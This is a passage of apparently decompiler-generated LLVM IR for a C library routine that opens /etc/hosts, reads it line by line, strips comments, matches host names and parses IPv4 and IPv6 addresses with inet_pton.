  %tmp151 = icmp ult i32 %v1_804da22, 8
  br i1 %tmp151, label %dec_label_pc_804dc95, label %dec_label_pc_804da2e

dec_label_pc_804da2e:                             ; preds = %dec_label_pc_804da22
  %v0_804da2e = load i32, i32* @ebp, align 4
  %tmp152 = icmp ult i32 %v0_804da2e, 16
  br i1 %tmp152, label %dec_label_pc_804dc95, label %dec_label_pc_804da37

dec_label_pc_804da37:                             ; preds = %dec_label_pc_804da2e
  %v1_804da37 = add i32 %v0_804da22, -48
  store i32 %v1_804da37, i32* %eax.global-to-local, align 4
  %tmp153 = icmp ult i32 %v1_804da37, 8
  br i1 %tmp153, label %dec_label_pc_804dc95, label %dec_label_pc_804da43

dec_label_pc_804da43:                             ; preds = %dec_label_pc_804da37
  %v0_804da43 = load i32, i32* @ebx, align 4
  %v1_804da43 = add i32 %v0_804da43, 48
  %v1_804da46 = add i32 %v0_804da22, -44
  store i32 %v1_804da46, i32* @ebp, align 4
  %v1_804da4d = add i32 %v0_804da22, -56
  store i32 %v1_804da4d, i32* @eax, align 4
  %v1_804da50 = add i32 %v0_804da43, 36
  store i32 %v1_804da50, i32* @edi, align 4
  %v7_804da53 = icmp ult i32 %v1_804da4d, %v1_804da46
  br i1 %v7_804da53, label %dec_label_pc_804da5c, label %dec_label_pc_804da57

dec_label_pc_804da57:                             ; preds = %dec_label_pc_804da43
  %v1_804da57 = add i32 %v0_804da43, 44
  store i32 %v1_804da57, i32* @esi, align 4
  br label %dec_label_pc_804da61

dec_label_pc_804da5c:                             ; preds = %dec_label_pc_804da43
  %v1_804da5c = add i32 %v0_804da43, 56
  store i32 %v1_804da5c, i32* @esi, align 4
  store i32 %v1_804da4d, i32* @ebp, align 4
  br label %dec_label_pc_804da61

dec_label_pc_804da61:                             ; preds = %dec_label_pc_804da57, %dec_label_pc_804da5c
  %v0_804da61 = phi i32 [ %v1_804da46, %dec_label_pc_804da57 ], [ %v1_804da4d, %dec_label_pc_804da5c ]
  %tmp154 = icmp ult i32 %v0_804da61, 80
  br i1 %tmp154, label %dec_label_pc_804dc95, label %dec_label_pc_804da6a

dec_label_pc_804da6a:                             ; preds = %dec_label_pc_804da61
  %v0_804da6a = call i32 @__open_etc_hosts()
  store i32 %v0_804da6a, i32* %eax.global-to-local, align 4
  %v1_804da73 = icmp eq i32 %v0_804da6a, 0
  br i1 %v1_804da73, label %dec_label_pc_804da97, label %dec_label_pc_804da77

dec_label_pc_804da77:                             ; preds = %dec_label_pc_804da6a
  store i32 %v1_804d9fa, i32* %edx.global-to-local, align 4
  store i32 %v1_804da43, i32* %eax.global-to-local, align 4
  store i8* %v5_804da00, i8** %stack_var_-44, align 4
  %v0_804da82 = load i32, i32* @edi, align 4
  %v0_804da8e = load i32, i32* @esi, align 4
  %v5_804da8e = inttoptr i32 %v0_804da8e to i8*
  br label %dec_label_pc_804db45

dec_label_pc_804da97:                             ; preds = %dec_label_pc_804da6a
  store i32 %arg8, i32* %edx.global-to-local, align 4
  %v1_804da9b = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v1_804da9b, align 4
  %v1_804daa1 = call i32 @__errno_location(i32 0)
  store i32 %v1_804daa1, i32* %eax.global-to-local, align 4
  %v1_804daa6 = inttoptr i32 %v1_804daa1 to i32*
  %v2_804daa6 = load i32, i32* %v1_804daa6, align 4
  store i32 %v2_804daa6, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dc95

dec_label_pc_804dab1:                             ; preds = %dec_label_pc_804dc18
  store i32 %stack_var_-40.0, i32* %eax.global-to-local, align 4
  %v2_804dab5 = load i8*, i8** %stack_var_-44, align 4
  %v3_804dab5 = ptrtoint i8* %v2_804dab5 to i32
  %v2_804dab8 = inttoptr i32 %stack_var_-40.0 to i32*
  store i32 %v3_804dab5, i32* %v2_804dab8, align 4
  %v0_804daba = load i32, i32* %eax.global-to-local, align 4
  %v1_804daba = add i32 %v0_804daba, 4
  %v2_804daba = inttoptr i32 %v1_804daba to i32*
  store i32 0, i32* %v2_804daba, align 4
  store i32 %tmp59, i32* %edx.global-to-local, align 4
  %v0_804dac5 = load i32, i32* @ebx, align 4
  %v1_804dac5 = add i32 %v0_804dac5, 4
  %v2_804dac5 = inttoptr i32 %v1_804dac5 to i32*
  %v3_804dac5 = load i32, i32* %v2_804dac5, align 4
  store i32 %v3_804dac5, i32* %eax.global-to-local, align 4
  store i32 %v3_804dac5, i32* %arg5, align 4
  %v0_804daca = load i32, i32* %edx.global-to-local, align 4
  %v1_804daca = add i32 %v0_804daca, 8
  %v2_804daca = inttoptr i32 %v1_804daca to i32*
  store i32 2, i32* %v2_804daca, align 4
  %v0_804dad1 = load i32, i32* %edx.global-to-local, align 4
  %v1_804dad1 = add i32 %v0_804dad1, 12
  %v2_804dad1 = inttoptr i32 %v1_804dad1 to i32*
  store i32 4, i32* %v2_804dad1, align 4
  br label %dec_label_pc_804db0a

dec_label_pc_804dade:                             ; preds = %dec_label_pc_804dc3a
  store i32 %stack_var_-32.0, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-36.0, i32* %eax.global-to-local, align 4
  %v2_804dae6 = inttoptr i32 %stack_var_-32.0 to i32*
  store i32 %stack_var_-36.0, i32* %v2_804dae6, align 4
  %v0_804dae8 = load i32, i32* %edx.global-to-local, align 4
  %v1_804dae8 = add i32 %v0_804dae8, 4
  %v2_804dae8 = inttoptr i32 %v1_804dae8 to i32*
  store i32 0, i32* %v2_804dae8, align 4
  store i32 %tmp59, i32* %edx.global-to-local, align 4
  %v0_804daf3 = load i32, i32* @ebx, align 4
  %v1_804daf3 = add i32 %v0_804daf3, 4
  %v2_804daf3 = inttoptr i32 %v1_804daf3 to i32*
  %v3_804daf3 = load i32, i32* %v2_804daf3, align 4
  store i32 %v3_804daf3, i32* %eax.global-to-local, align 4
  store i32 %v3_804daf3, i32* %arg5, align 4
  %v0_804daf8 = load i32, i32* %edx.global-to-local, align 4
  %v1_804daf8 = add i32 %v0_804daf8, 8
  %v2_804daf8 = inttoptr i32 %v1_804daf8 to i32*
  store i32 10, i32* %v2_804daf8, align 4
  %v0_804daff = load i32, i32* %edx.global-to-local, align 4
  %v1_804daff = add i32 %v0_804daff, 12
  %v2_804daff = inttoptr i32 %v1_804daff to i32*
  store i32 16, i32* %v2_804daff, align 4
  br label %dec_label_pc_804db0a

dec_label_pc_804db0a:                             ; preds = %dec_label_pc_804dab1, %dec_label_pc_804dade
  %storemerge = phi i32 [ %stack_var_-40.0, %dec_label_pc_804dab1 ], [ %stack_var_-32.0, %dec_label_pc_804dade ]
  %v1_804db0a = load i32, i32* %edx.global-to-local, align 4
  %v2_804db0a = add i32 %v1_804db0a, 16
  %v3_804db0a = inttoptr i32 %v2_804db0a to i32*
  store i32 %storemerge, i32* %v3_804db0a, align 4
  %v0_804db0d = load i32, i32* @ebx, align 4
  %v1_804db0d = add i32 %v0_804db0d, 8
  %v1_804db10 = load i32, i32* %edx.global-to-local, align 4
  %v2_804db10 = add i32 %v1_804db10, 4
  %v3_804db10 = inttoptr i32 %v2_804db10 to i32*
  store i32 %v1_804db0d, i32* %v3_804db10, align 4
  store i32 %arg8, i32* @eax, align 4
  %v0_804db17 = load i32, i32* %edx.global-to-local, align 4
  %v2_804db17 = inttoptr i32 %arg8 to i32*
  store i32 %v0_804db17, i32* %v2_804db17, align 4
  br label %dec_label_pc_804dc75

dec_label_pc_804db26:                             ; preds = %dec_label_pc_804d9fa
  store i8* null, i8** %stack_var_-44, align 4
  %.pre = inttoptr i32 %arg9 to i32*
  br label %dec_label_pc_804db45

dec_label_pc_804db45:                             ; preds = %dec_label_pc_804da77, %dec_label_pc_804db26
  %v1_804db49.pre-phi = phi i32* [ %v1_804da16, %dec_label_pc_804da77 ], [ %.pre, %dec_label_pc_804db26 ]
  %stack_var_-32.0 = phi i32 [ %v1_804da43, %dec_label_pc_804da77 ], [ 0, %dec_label_pc_804db26 ]
  %stack_var_-36.0 = phi i32 [ %v1_804d9fa, %dec_label_pc_804da77 ], [ 0, %dec_label_pc_804db26 ]
  %stack_var_-40.0 = phi i32 [ %v0_804da82, %dec_label_pc_804da77 ], [ 0, %dec_label_pc_804db26 ]
  %stack_var_4.0 = phi i32 [ %v0_804da6a, %dec_label_pc_804da77 ], [ %arg1, %dec_label_pc_804db26 ]
  %stack_var_-20.0 = phi i8* [ %v5_804da8e, %dec_label_pc_804da77 ], [ %v5_804da00, %dec_label_pc_804db26 ]
  store i32 %arg9, i32* @edx, align 4
  store i32 1, i32* %v1_804db49.pre-phi, align 4
  %v4_804dc61 = ptrtoint i8* %stack_var_-20.0 to i32
  %v4_804dbfe = inttoptr i32 %arg2 to i8*
  %v0_804dc5b120127 = load i32, i32* @edx, align 4
  %v3_804dc65121128 = call i32 @fgets(i32 %v4_804dc61, i32 %stack_var_4.0, i32 %v0_804dc5b120127)
  store i32 %v3_804dc65121128, i32* @eax, align 4
  %v1_804dc6d122129 = icmp eq i32 %v3_804dc65121128, 0
  %v1_804dc6f123130 = icmp eq i1 %v1_804dc6d122129, false
  br i1 %v1_804dc6f123130, label %dec_label_pc_804db5c.lr.ph.lr.ph, label %dec_label_pc_804dc75

dec_label_pc_804db5c.lr.ph.lr.ph:                 ; preds = %dec_label_pc_804db45
  %v12_804dc33 = icmp eq i32 %arg3, 10
  %v12_804dc11 = icmp eq i32 %arg3, 2
  %v12_804dbd8 = icmp eq i32 %arg4, 2
  %v1_804dbdd = icmp eq i1 %v12_804dbd8, false
  %v1_804dc16 = icmp eq i1 %v12_804dc11, false
  %v1_804dc38 = icmp eq i1 %v12_804dc33, false
  br label %dec_label_pc_804db5c.lr.ph

dec_label_pc_804db5c.lr.ph:                       ; preds = %dec_label_pc_804db5c.lr.ph.lr.ph, %dec_label_pc_804dc5b.outer.backedge
  %stack_var_-28.0.ph131 = phi i32 [ 1, %dec_label_pc_804db5c.lr.ph.lr.ph ], [ 2, %dec_label_pc_804dc5b.outer.backedge ]
  br label %dec_label_pc_804db5c

dec_label_pc_804db5c:                             ; preds = %dec_label_pc_804db5c.lr.ph, %dec_label_pc_804dc5b.backedge
  %v3_804db64 = call i32 @__GI_strchr(i8* %stack_var_-20.0, i32 35)
  store i32 %v3_804db64, i32* @eax, align 4
  %v1_804db6c = icmp eq i32 %v3_804db64, 0
  br i1 %v1_804db6c, label %dec_label_pc_804db73, label %dec_label_pc_804db70

dec_label_pc_804db70:                             ; preds = %dec_label_pc_804db5c
  %v1_804db70 = inttoptr i32 %v3_804db64 to i8*
  store i8 0, i8* %v1_804db70, align 1
  br label %dec_label_pc_804db73

dec_label_pc_804db73:                             ; preds = %dec_label_pc_804db5c, %dec_label_pc_804db70
  store i32 %v4_804dc61, i32* @ecx, align 4
  store i32 0, i32* @edi, align 4
  %v2_804dbb332 = load i8, i8* %stack_var_-20.0, align 1
  %v3_804dbb333 = icmp eq i8 %v2_804dbb332, 0
  %v1_804dbb639 = icmp eq i1 %v3_804dbb333, false
  br i1 %v1_804dbb639, label %dec_label_pc_804db7f.preheader.preheader, label %dec_label_pc_804dbb8

dec_label_pc_804db7f.preheader.preheader:         ; preds = %dec_label_pc_804db73
  %v4_804db7f97.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_804db7f.preheader

dec_label_pc_804db7b:                             ; preds = %dec_label_pc_804db85
  store i8 0, i8* %v1_804db7f102, align 1
  %v0_804db7e = load i32, i32* @ecx, align 4
  %v1_804db7e = add i32 %v0_804db7e, 1
  store i32 %v1_804db7e, i32* @ecx, align 4
  %v1_804db7f = inttoptr i32 %v1_804db7e to i8*
  %v2_804db7f = load i8, i8* %v1_804db7f, align 1
  %v3_804db7f = zext i8 %v2_804db7f to i32
  %v4_804db7f = load i32, i32* %eax.global-to-local, align 4
  %v5_804db7f = and i32 %v4_804db7f, -256
  %v6_804db7f = or i32 %v5_804db7f, %v3_804db7f
  store i32 %v6_804db7f, i32* @eax, align 4
  %v4_804db81 = icmp eq i8 %v2_804db7f, 0
  br i1 %v4_804db81, label %dec_label_pc_804db7f.dec_label_pc_804dbb8.loopexit_crit_edge, label %dec_label_pc_804db85

dec_label_pc_804db85:                             ; preds = %dec_label_pc_804db7f.preheader, %dec_label_pc_804db7b
  %v2_804db7f103 = phi i8 [ %v2_804db7f, %dec_label_pc_804db7b ], [ %v2_804db7f95, %dec_label_pc_804db7f.preheader ]
  %v1_804db7f102 = phi i8* [ %v1_804db7f, %dec_label_pc_804db7b ], [ %v1_804db7f94, %dec_label_pc_804db7f.preheader ]
  %v0_804db7b101 = phi i32 [ %v1_804db7e, %dec_label_pc_804db7b ], [ %v0_804db7f47, %dec_label_pc_804db7f.preheader ]
  %v2_804db85 = sext i8 %v2_804db7f103 to i32
  store i32 %v2_804db85, i32* @edx, align 4
  %v0_804db88 = load i32, i32* @global_var_8052038, align 8
  store i32 %v0_804db88, i32* %eax.global-to-local, align 4
  %v2_804db8d = mul nsw i32 %v2_804db85, 2
  %v3_804db8d = add i32 %v0_804db88, %v2_804db8d
  %v4_804db8d = inttoptr i32 %v3_804db8d to i8*
  %v5_804db8d = load i8, i8* %v4_804db8d, align 1
  %v6_804db8d = and i8 %v5_804db8d, 32
  %v7_804db8d = icmp eq i8 %v6_804db8d, 0
  %v1_804db91 = icmp eq i1 %v7_804db8d, false
  br i1 %v1_804db91, label %dec_label_pc_804db7b, label %dec_label_pc_804db93

dec_label_pc_804db93:                             ; preds = %dec_label_pc_804db85
  %v0_804db93 = load i32, i32* @edi, align 4
  %v1_804db93 = add i32 %v0_804db93, -6
  %v6_804db93 = sub i32 5, %v0_804db93
  %v7_804db93 = and i32 %v6_804db93, %v0_804db93
  %v8_804db93 = icmp slt i32 %v7_804db93, 0
  %v9_804db93 = icmp eq i32 %v1_804db93, 0
  %v10_804db93 = icmp slt i32 %v1_804db93, 0
  %v3_804db96 = icmp eq i1 %v10_804db93, %v8_804db93
  %v4_804db96 = icmp eq i1 %v9_804db93, false
  %v5_804db96 = and i1 %v4_804db96, %v3_804db96
  br i1 %v5_804db96, label %dec_label_pc_804db9f.preheader, label %dec_label_pc_804db98

dec_label_pc_804db98:                             ; preds = %dec_label_pc_804db93
  %v1_804db98 = load i32, i32* @ebx, align 4
  %v3_804db98 = mul i32 %v0_804db93, 4
  %v4_804db98 = add i32 %v1_804db98, %v3_804db98
  %v5_804db98 = inttoptr i32 %v4_804db98 to i32*
  store i32 %v0_804db7b101, i32* %v5_804db98, align 4
  %v0_804db9b = load i32, i32* @edi, align 4
  %v1_804db9b = add i32 %v0_804db9b, 1
  store i32 %v1_804db9b, i32* @edi, align 4
  %v0_804db9f.pre.pre = load i32, i32* @ecx, align 4
  %v4_804db9f.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804db9f.preheader

dec_label_pc_804db9f.preheader:                   ; preds = %dec_label_pc_804db98, %dec_label_pc_804db93
  %v4_804db9f.pre = phi i32 [ %v4_804db9f.pre.pre, %dec_label_pc_804db98 ], [ %v0_804db88, %dec_label_pc_804db93 ]
  %v0_804db9f.pre = phi i32 [ %v0_804db9f.pre.pre, %dec_label_pc_804db98 ], [ %v0_804db7b101, %dec_label_pc_804db93 ]
  %v1_804dbb852 = phi i32 [ %v1_804db9b, %dec_label_pc_804db98 ], [ %v0_804db93, %dec_label_pc_804db93 ]
  %v1_804db9f104 = inttoptr i32 %v0_804db9f.pre to i8*
  %v2_804db9f105 = load i8, i8* %v1_804db9f104, align 1
  %v3_804db9f106 = zext i8 %v2_804db9f105 to i32
  %v5_804db9f107 = and i32 %v4_804db9f.pre, -256
  %v6_804db9f108 = or i32 %v3_804db9f106, %v5_804db9f107
  store i32 %v6_804db9f108, i32* @eax, align 4
  %v4_804dba1109 = icmp eq i8 %v2_804db9f105, 0
  br i1 %v4_804dba1109, label %dec_label_pc_804dbb3.loopexit, label %dec_label_pc_804dba5.lr.ph

dec_label_pc_804dba5.lr.ph:                       ; preds = %dec_label_pc_804db9f.preheader
  %v0_804dba8.pre = load i32, i32* @global_var_8052038, align 8
  br label %dec_label_pc_804dba5

dec_label_pc_804db9e:                             ; preds = %dec_label_pc_804dba5
  %v1_804db9e = add i32 %v0_804dbb3110, 1
  store i32 %v1_804db9e, i32* @ecx, align 4
  %v1_804db9f = inttoptr i32 %v1_804db9e to i8*
  %v2_804db9f = load i8, i8* %v1_804db9f, align 1
  %v3_804db9f = zext i8 %v2_804db9f to i32
  %v5_804db9f = and i32 %v0_804dba8.pre, -256
  %v6_804db9f = or i32 %v3_804db9f, %v5_804db9f
  store i32 %v6_804db9f, i32* @eax, align 4
  %v4_804dba1 = icmp eq i8 %v2_804db9f, 0
  br i1 %v4_804dba1, label %dec_label_pc_804dbb3.loopexit, label %dec_label_pc_804dba5

dec_label_pc_804dba5:                             ; preds = %dec_label_pc_804dba5.lr.ph, %dec_label_pc_804db9e
  %v2_804db9f112 = phi i8 [ %v2_804db9f105, %dec_label_pc_804dba5.lr.ph ], [ %v2_804db9f, %dec_label_pc_804db9e ]
  %v1_804db9f111 = phi i8* [ %v1_804db9f104, %dec_label_pc_804dba5.lr.ph ], [ %v1_804db9f, %dec_label_pc_804db9e ]
  %v0_804dbb3110 = phi i32 [ %v0_804db9f.pre, %dec_label_pc_804dba5.lr.ph ], [ %v1_804db9e, %dec_label_pc_804db9e ]
  %v2_804dba5 = sext i8 %v2_804db9f112 to i32
  store i32 %v2_804dba5, i32* @edx, align 4
  store i32 %v0_804dba8.pre, i32* @eax, align 4
  %v2_804dbad = mul nsw i32 %v2_804dba5, 2
  %v3_804dbad = add i32 %v0_804dba8.pre, %v2_804dbad
  %v4_804dbad = inttoptr i32 %v3_804dbad to i8*
  %v5_804dbad = load i8, i8* %v4_804dbad, align 1
  %v6_804dbad = and i8 %v5_804dbad, 32
  %v7_804dbad = icmp eq i8 %v6_804dbad, 0
  br i1 %v7_804dbad, label %dec_label_pc_804db9e, label %dec_label_pc_804dbb3.loopexit

dec_label_pc_804dbb3.loopexit:                    ; preds = %dec_label_pc_804dba5, %dec_label_pc_804db9e, %dec_label_pc_804db9f.preheader
  %v4_804db7f97144 = phi i32 [ %v6_804db9f108, %dec_label_pc_804db9f.preheader ], [ %v6_804db9f, %dec_label_pc_804db9e ], [ %v0_804dba8.pre, %dec_label_pc_804dba5 ]
  %v0_804dbb3.lcssa = phi i32 [ %v0_804db9f.pre, %dec_label_pc_804db9f.preheader ], [ %v1_804db9e, %dec_label_pc_804db9e ], [ %v0_804dbb3110, %dec_label_pc_804dba5 ]
  %v1_804db9f.lcssa = phi i8* [ %v1_804db9f104, %dec_label_pc_804db9f.preheader ], [ %v1_804db9f, %dec_label_pc_804db9e ], [ %v1_804db9f111, %dec_label_pc_804dba5 ]
  %v2_804dbb3 = load i8, i8* %v1_804db9f.lcssa, align 1
  %v3_804dbb3 = icmp eq i8 %v2_804dbb3, 0
  %v1_804dbb6 = icmp eq i1 %v3_804dbb3, false
  br i1 %v1_804dbb6, label %dec_label_pc_804db7f.preheader, label %dec_label_pc_804dbb8

dec_label_pc_804db7f.preheader:                   ; preds = %dec_label_pc_804db7f.preheader.preheader, %dec_label_pc_804dbb3.loopexit
  %v1_804dbb8.pre147 = phi i32 [ %v1_804dbb852, %dec_label_pc_804dbb3.loopexit ], [ 0, %dec_label_pc_804db7f.preheader.preheader ]
  %v4_804db7f97 = phi i32 [ %v4_804db7f97144, %dec_label_pc_804dbb3.loopexit ], [ %v4_804db7f97.pre, %dec_label_pc_804db7f.preheader.preheader ]
  %v0_804db7f47 = phi i32 [ %v0_804dbb3.lcssa, %dec_label_pc_804dbb3.loopexit ], [ %v4_804dc61, %dec_label_pc_804db7f.preheader.preheader ]
  %v1_804db7f94 = inttoptr i32 %v0_804db7f47 to i8*
  %v2_804db7f95 = load i8, i8* %v1_804db7f94, align 1
  %v3_804db7f96 = zext i8 %v2_804db7f95 to i32
  %v5_804db7f98 = and i32 %v4_804db7f97, -256
  %v6_804db7f99 = or i32 %v5_804db7f98, %v3_804db7f96
  store i32 %v6_804db7f99, i32* @eax, align 4
  %v4_804db81100 = icmp eq i8 %v2_804db7f95, 0
  br i1 %v4_804db81100, label %dec_label_pc_804dbb8, label %dec_label_pc_804db85

dec_label_pc_804db7f.dec_label_pc_804dbb8.loopexit_crit_edge: ; preds = %dec_label_pc_804db7b
  %v1_804dbb8.pre.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804dbb8

dec_label_pc_804dbb8:                             ; preds = %dec_label_pc_804dbb3.loopexit, %dec_label_pc_804db7f.dec_label_pc_804dbb8.loopexit_crit_edge, %dec_label_pc_804db7f.preheader, %dec_label_pc_804db73
  %v1_804dbb8 = phi i32 [ 0, %dec_label_pc_804db73 ], [ %v1_804dbb8.pre.pre, %dec_label_pc_804db7f.dec_label_pc_804dbb8.loopexit_crit_edge ], [ %v1_804dbb8.pre147, %dec_label_pc_804db7f.preheader ], [ %v1_804dbb852, %dec_label_pc_804dbb3.loopexit ]
  %v0_804dbb8 = load i32, i32* @ebx, align 4
  %v2_804dbb8 = mul i32 %v1_804dbb8, 4
  %v3_804dbb8 = add i32 %v2_804dbb8, %v0_804dbb8
  %v4_804dbb8 = inttoptr i32 %v3_804dbb8 to i32*
  store i32 0, i32* %v4_804dbb8, align 4
  %v0_804dbbf = load i32, i32* @edi, align 4
  %v7_804dbc2 = icmp sgt i32 %v0_804dbbf, 1
  br i1 %v7_804dbc2, label %dec_label_pc_804dbc8, label %dec_label_pc_804dc5b.backedge

dec_label_pc_804dbc8:                             ; preds = %dec_label_pc_804dbb8
  br i1 %v12_804da04, label %dec_label_pc_804dc95, label %dec_label_pc_804dbd3

dec_label_pc_804dbd3:                             ; preds = %dec_label_pc_804dbc8
  store i32 1, i32* @esi, align 4
  br i1 %v1_804dbdd, label %dec_label_pc_804dbf5.lr.ph, label %dec_label_pc_804dbdf

dec_label_pc_804dbf5.lr.ph:                       ; preds = %dec_label_pc_804dbd3
  %v0_804dbf5.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_804dbf5

dec_label_pc_804dbdf:                             ; preds = %dec_label_pc_804dbd3
  %v0_804dbdf = load i32, i32* @eax, align 4
  %v0_804dbe1 = load i32, i32* @ebx, align 4
  %v1_804dbe1 = inttoptr i32 %v0_804dbe1 to i32*
  %v2_804dbe1 = load i32, i32* %v1_804dbe1, align 4
  %v5_804dbe7 = call i32 @__GI_strcoll(i8* %v4_804dbfe, i32 %v2_804dbe1, i32 %v0_804dbdf, i32 %v0_804dbdf)
  store i32 %v5_804dbe7, i32* %eax.global-to-local, align 4
  %v1_804dbef = icmp eq i32 %v5_804dbe7, 0
  %v1_804dbf1 = icmp eq i1 %v1_804dbef, false
  br i1 %v1_804dbf1, label %dec_label_pc_804dc5b.backedge, label %dec_label_pc_804dc11

dec_label_pc_804dc5b.backedge:                    ; preds = %dec_label_pc_804dc0a, %dec_label_pc_804dbdf, %dec_label_pc_804dbb8
  %v0_804dc5b = load i32, i32* @edx, align 4
  %v3_804dc65 = call i32 @fgets(i32 %v4_804dc61, i32 %stack_var_4.0, i32 %v0_804dc5b)
  store i32 %v3_804dc65, i32* @eax, align 4
  %v1_804dc6d = icmp eq i32 %v3_804dc65, 0
  %v1_804dc6f = icmp eq i1 %v1_804dc6d, false
  br i1 %v1_804dc6f, label %dec_label_pc_804db5c, label %dec_label_pc_804dc75

dec_label_pc_804dbf5:                             ; preds = %dec_label_pc_804dbf5.lr.ph, %dec_label_pc_804dc0a
  %v0_804dbf5 = phi i32 [ %v0_804dbf5.pre, %dec_label_pc_804dbf5.lr.ph ], [ %v5_804dbfe, %dec_label_pc_804dc0a ]
  %v1_804dbf7119 = phi i32 [ 1, %dec_label_pc_804dbf5.lr.ph ], [ %v1_804dc0a, %dec_label_pc_804dc0a ]
  %v0_804dbf7 = load i32, i32* @ebx, align 4
  %v2_804dbf7 = mul i32 %v1_804dbf7119, 4
  %v3_804dbf7 = add i32 %v0_804dbf7, %v2_804dbf7
  %v4_804dbf7 = inttoptr i32 %v3_804dbf7 to i32*
  %v5_804dbf7 = load i32, i32* %v4_804dbf7, align 4
  %v5_804dbfe = call i32 @__GI_strcasecmp(i8* %v4_804dbfe, i32 %v5_804dbf7, i32 %v0_804dbf5, i32 %v0_804dbf5)
  store i32 %v5_804dbfe, i32* %eax.global-to-local, align 4
  %v1_804dc06 = icmp eq i32 %v5_804dbfe, 0
  br i1 %v1_804dc06, label %dec_label_pc_804dc11, label %dec_label_pc_804dc0a

dec_label_pc_804dc0a:                             ; preds = %dec_label_pc_804dbf5
  %v0_804dc0a = load i32, i32* @esi, align 4
  %v1_804dc0a = add i32 %v0_804dc0a, 1
  store i32 %v1_804dc0a, i32* @esi, align 4
  %v1_804dc0b.pre = load i32, i32* @edi, align 4
  %v5_804dc0d = icmp slt i32 %v1_804dc0a, %v1_804dc0b.pre
  br i1 %v5_804dc0d, label %dec_label_pc_804dbf5, label %dec_label_pc_804dc5b.backedge

dec_label_pc_804dc11:                             ; preds = %dec_label_pc_804dbdf, %dec_label_pc_804dbf5
  br i1 %v1_804dc16, label %dec_label_pc_804dc33, label %dec_label_pc_804dc18

dec_label_pc_804dc18:                             ; preds = %dec_label_pc_804dc11
  %v0_804dc18 = load i32, i32* @esi, align 4
  %v3_804dc19 = load i8*, i8** %stack_var_-44, align 4
  %v4_804dc19 = ptrtoint i8* %v3_804dc19 to i32
  %v0_804dc1d = load i32, i32* @ebx, align 4
  %v1_804dc1d = inttoptr i32 %v0_804dc1d to i32*
  %v2_804dc1d = load i32, i32* %v1_804dc1d, align 4
  %v4_804dc21 = inttoptr i32 %v2_804dc1d to i8*
  %v5_804dc21 = call i32 @inet_pton(i32 2, i8* %v4_804dc21, i32 %v4_804dc19, i32 %v0_804dc18)
  store i32 %v5_804dc21, i32* %eax.global-to-local, align 4
  %tmp84 = icmp slt i32 %v5_804dc21, 1
  %tmp85 = icmp eq i1 %tmp84, false
  br i1 %tmp85, label %dec_label_pc_804dab1, label %dec_label_pc_804dc5b.outer.backedge

dec_label_pc_804dc5b.outer.backedge:              ; preds = %dec_label_pc_804dc18, %dec_label_pc_804dc3a, %dec_label_pc_804dc33
  %v0_804dc5b120 = load i32, i32* @edx, align 4
  %v3_804dc65121 = call i32 @fgets(i32 %v4_804dc61, i32 %stack_var_4.0, i32 %v0_804dc5b120)
  store i32 %v3_804dc65121, i32* @eax, align 4
  %v1_804dc6d122 = icmp eq i32 %v3_804dc65121, 0
  %v1_804dc6f123 = icmp eq i1 %v1_804dc6d122, false
  br i1 %v1_804dc6f123, label %dec_label_pc_804db5c.lr.ph, label %dec_label_pc_804dc75

dec_label_pc_804dc33:                             ; preds = %dec_label_pc_804dc11
  br i1 %v1_804dc38, label %dec_label_pc_804dc5b.outer.backedge, label %dec_label_pc_804dc3a

dec_label_pc_804dc3a:                             ; preds = %dec_label_pc_804dc33
  %v0_804dc3a = load i32, i32* @ecx, align 4
  %v0_804dc3f = load i32, i32* @ebx, align 4
  %v1_804dc3f = inttoptr i32 %v0_804dc3f to i32*
  %v2_804dc3f = load i32, i32* %v1_804dc3f, align 4
  %v4_804dc43 = inttoptr i32 %v2_804dc3f to i8*
  %v5_804dc43 = call i32 @inet_pton(i32 10, i8* %v4_804dc43, i32 %stack_var_-36.0, i32 %v0_804dc3a)
  store i32 %v5_804dc43, i32* %eax.global-to-local, align 4
  %tmp86 = icmp slt i32 %v5_804dc43, 1
  %tmp87 = icmp eq i1 %tmp86, false
  br i1 %tmp87, label %dec_label_pc_804dade, label %dec_label_pc_804dc5b.outer.backedge

dec_label_pc_804dc75:                             ; preds = %dec_label_pc_804dc5b.outer.backedge, %dec_label_pc_804db45, %dec_label_pc_804dc5b.backedge, %dec_label_pc_804db0a
  %stack_var_-28.1 = phi i32 [ 0, %dec_label_pc_804db0a ], [ 1, %dec_label_pc_804db45 ], [ 2, %dec_label_pc_804dc5b.outer.backedge ], [ %stack_var_-28.0.ph131, %dec_label_pc_804dc5b.backedge ]
  br i1 %v12_804da04, label %dec_label_pc_804dc95, label %dec_label_pc_804dc7c

dec_label_pc_804dc7c:                             ; preds = %dec_label_pc_804dc75
  %v1_804dc83 = inttoptr i32 %stack_var_4.0 to i16*
  %v2_804dc83 = call i32 @__GI_fclose(i16* %v1_804dc83)
  store i32 %v2_804dc83, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804dc95

dec_label_pc_804dc95:                             ; preds = %dec_label_pc_804dbc8, %dec_label_pc_804d9e5, %dec_label_pc_804d9f1, %dec_label_pc_804da0f, %dec_label_pc_804da22, %dec_label_pc_804da2e, %dec_label_pc_804da37, %dec_label_pc_804da61, %dec_label_pc_804dc75, %dec_label_pc_804dc7c, %dec_label_pc_804da97
  %stack_var_-28.2 = phi i32 [ %stack_var_-28.1, %dec_label_pc_804dc75 ], [ %stack_var_-28.1, %dec_label_pc_804dc7c ], [ %v2_804daa6, %dec_label_pc_804da97 ], [ 34, %dec_label_pc_804da61 ], [ 34, %dec_label_pc_804da37 ], [ 34, %dec_label_pc_804da2e ], [ 34, %dec_label_pc_804da22 ], [ 34, %dec_label_pc_804da0f ], [ 34, %dec_label_pc_804d9f1 ], [ 34, %dec_label_pc_804d9e5 ], [ %stack_var_-28.0.ph131, %dec_label_pc_804dbc8 ]
  store i32 %stack_var_-28.2, i32* %eax.global-to-local, align 4
  store i32 %v0_804d9d0, i32* @ebx, align 4
  store i32 %v0_804d9cf, i32* @esi, align 4
  store i32 %v0_804d9ce, i32* @edi, align 4
  store i32 %v0_804d9cd, i32* @ebp, align 4
  ret i32 %stack_var_-28.2

; uselistorder directives
  uselistorder i32 %stack_var_-28.2, { 1, 0 }
  uselistorder i32 %v1_804dc0a, { 0, 2, 1 }
